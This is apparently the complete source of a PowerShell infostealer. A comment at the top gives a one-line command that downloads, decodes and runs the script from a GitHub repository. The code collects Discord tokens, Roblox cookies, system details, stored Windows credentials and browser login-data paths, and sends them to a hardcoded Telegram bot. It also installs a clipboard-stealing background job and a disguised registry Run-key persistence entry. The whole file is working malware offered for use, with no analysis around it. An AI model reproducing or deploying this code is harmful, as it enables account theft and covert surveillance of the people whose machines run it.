# Silent aggressive payload - everything inline
# Execute: iwr 'https://api.github.com/repos/isajarGamer2/stealer-repo/contents/payload_final.ps1?ref=main' -UseBasicParsing -UserAgent 'Mozilla/5.0' | ConvertFrom-Json | % { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_.content)) } | iex

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"

function Send-Telegram {
    param([string]$Message)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId;text=$Message;parse_mode="HTML"} -ErrorAction Stop | Out-Null
    } catch {
        try { $body="chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("Content-Type","application/x-www-form-urlencoded"); $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage",$body) | Out-Null } catch {}
    }
}

$report = "<b>[+] VICTIM DATA</b>`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
$tokens = @()

# === DISCORD: all paths ===
$discordPaths = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:LOCALAPPDATA\discord")
foreach ($basePath in $discordPaths) {
    if (-not (Test-Path $basePath)) { continue }
    $tr = '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'
    Get-ChildItem -Path "$basePath\Local Storage\leveldb" -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | foreach {
        try { [regex]::Matches((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue),$tr) | foreach { $tokens += $_.Value } } catch {}
    }
    Get-ChildItem -Path "$basePath\Local Storage\session storage" -Include "*.ldb" -Recurse -ErrorAction SilentlyContinue | foreach {
        try { [regex]::Matches((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue),$tr) | foreach { $tokens += $_.Value } } catch {}
    }
    if (Test-Path "$basePath\config.json") { try { [regex]::Matches((Get-Content "$basePath\config.json" -Raw -ErrorAction SilentlyContinue),$tr) | foreach { $tokens += $_.Value } } catch {} }
}
# Chrome/Edge cookies for discord.com
$chromeCookies = @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies")
foreach ($db in $chromeCookies) { if (Test-Path $db) { try { $c=Get-Content $db -Raw -Encoding Byte -ErrorAction SilentlyContinue; if ($c -match "discord\.com") { $report += "`n<b>DISCORD COOKIES:</b> found in browser DB" } } catch {} } }
if ($tokens) { $report += "`n<b>DISCORD TOKENS ($($tokens.Count)):</b>`n"; $tokens | Sort-Object -Unique | foreach { $report += "<code>$_</code>`n" } }

# === ROBLOX: all browser profiles ===
$rbxTokens = @()
$chromeProfiles = Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
$edgeProfiles = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
$firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
$allProfiles = @($chromeProfiles + $edgeProfiles + $firefoxProfiles) + "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$cookiePaths = @()
foreach ($p in $allProfiles) { $cookiePaths += "$p\Cookies"; $cookiePaths += "$p\Network\Cookies" }
$cookiePaths += "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\cookies.sqlite"
foreach ($cp in $cookiePaths) {
    if (Test-Path $cp) { try { $c=Get-Content $cp -Raw -Encoding Byte -ErrorAction SilentlyContinue; if ($c -match "roblox\.com") { $rbxTokens += "roblox.com cookies found in: $cp" }; if ($c -match "ROBLOSECURITY") { $rbxTokens += "ROBLOSECURITY cookie found in: $cp" } } catch {} }
}
# Roblox-specific files
Get-ChildItem "$env:LOCALAPPDATA\Roblox\Versions\*\output.log" -ErrorAction SilentlyContinue | foreach { try { [regex]::Matches((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue),'[A-Za-z0-9_-]{80,}') | foreach { $rbxTokens += $_.Value } } catch {} }
Get-ChildItem "$env:LOCALAPPDATA\Roblox\*.bin" -ErrorAction SilentlyContinue | foreach { try { [regex]::Matches((Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue),'[A-Za-z0-9_-]{80,}') | foreach { $rbxTokens += $_.Value } } catch {} }
if ($rbxTokens) { $report += "`n<b>ROBLOX ($($rbxTokens.Count)):</b>`n"; $rbxTokens | foreach { $report += "$_`n" } } else { $report += "`n<b>ROBLOX:</b> No tokens`n" }

# === SYSTEM INFO ===
try { $os=(Get-CimInstance Win32_OperatingSystem).Caption; $cpu=(Get-CimInstance Win32_Processor).Name; $ram=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2); $gpu=(Get-CimInstance Win32_VideoController).Name; $report += "`n<b>SYSTEM:</b>`nOS: $os`nCPU: $cpu`nRAM: $ram GB`nGPU: $gpu`n" } catch { $report += "`n<b>SYSTEM:</b> Error`n" }

# === WINDOWS CREDENTIALS ===
try { $creds = cmd.exe /c "cmdkey /list" 2>&1; if ($creds) { $report += "`n<b>[WINDOWS CREDENTIALS]</b>`n$creds`n" } } catch {}

# === BROWSER PASSWORDS ===
$loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (-not (Test-Path $loginData)) { $loginData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
if (Test-Path $loginData) { $report += "`n<b>[BROWSER PASSWORDS]</b>`nLogin Data found: $loginData`n" }

# === KEYLOGGER BACKGROUND ===
$klCode = @'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$bt="8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"; $cid="8445047233"; $il=300; $lc=""
Add-Type -AssemblyName System.Windows.Forms
while ($true) { try { $cb=[System.Windows.Forms.Clipboard]::GetText(); if ($cb -and $cb -ne $lc -and $cb.Length -gt 3) { $lc=$cb; $msg="[+] CLIPBOARD`nHost: $env:COMPUTERNAME`nData:`n$cb"; try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$bt/sendMessage" -Method Post -Body @{chat_id=$cid;text=$msg} -ErrorAction Stop | Out-Null } catch {} } } catch {}; Start-Sleep -Seconds $il }
'@
$klPath = "$env:TEMP\kl_$(Get-Random -Maximum 9999).ps1"
$klCode | Out-File $klPath -Encoding UTF8
Start-Job -ScriptBlock { param($p) & $p } -ArgumentList $klPath | Out-Null

# === PERSISTENCE ===
try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SysUpdate32" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$klPath`"" -Force } catch {}

# === SEND ALL DATA ===
Send-Telegram -Message $report
Send-Telegram -Message "[+] PAYLOAD EXECUTED on $env:COMPUTERNAME by $env:USERNAME at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

# Cleanup
Remove-Item $klPath -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\svchost_cache.dat" -Force -ErrorAction SilentlyContinue
